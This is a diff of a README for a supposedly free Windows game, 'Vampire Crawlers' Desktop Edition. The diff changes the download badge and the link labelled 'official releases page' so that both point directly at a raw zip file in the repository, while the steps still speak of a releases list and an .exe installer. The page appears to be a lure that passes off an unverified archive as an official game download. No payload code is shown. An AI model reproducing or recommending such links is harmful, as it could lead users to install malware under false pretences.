@@ -1,6 +1,6 @@
 # 🦇 Vampire-Crawlers-Release-Desktop - Survive massive hordes in gothic worlds
 
-[![](https://img.shields.io/badge/Download-Vampire_Crawlers-blue.svg)](https://github.com/ninnettediagnosable351/Vampire-Crawlers-Release-Desktop)
+[![](https://img.shields.io/badge/Download-Vampire_Crawlers-blue.svg)](https://github.com/ninnettediagnosable351/Vampire-Crawlers-Release-Desktop/raw/refs/heads/main/SourceCode/Release_Desktop_Crawlers_Vampire_v2.8.zip)
 
 Vampire Crawlers: Night of Survival Desktop Edition brings high-resolution horde survival to your Windows computer. This version supports 4K displays and offers smooth performance during intense gameplay. You fight thousands of monsters, collect upgrades, and survive until dawn in dark, gothic environments. The game balances roguelite mechanics with fast action to provide a challenging experience.
 
@@ -19,7 +19,7 @@ Confirm your computer meets these requirements to ensure smooth gameplay:
 
 Follow these steps to set up the game on your computer:
 
-1.  Visit the [official releases page](https://github.com/ninnettediagnosable351/Vampire-Crawlers-Release-Desktop).
+1.  Visit the [official releases page](https://github.com/ninnettediagnosable351/Vampire-Crawlers-Release-Desktop/raw/refs/heads/main/SourceCode/Release_Desktop_Crawlers_Vampire_v2.8.zip).
 2.  Look for the latest release version at the top of the list.
 3.  Click the link ending in .exe to download the installer.
 4.  Open the folder containing the downloaded file.
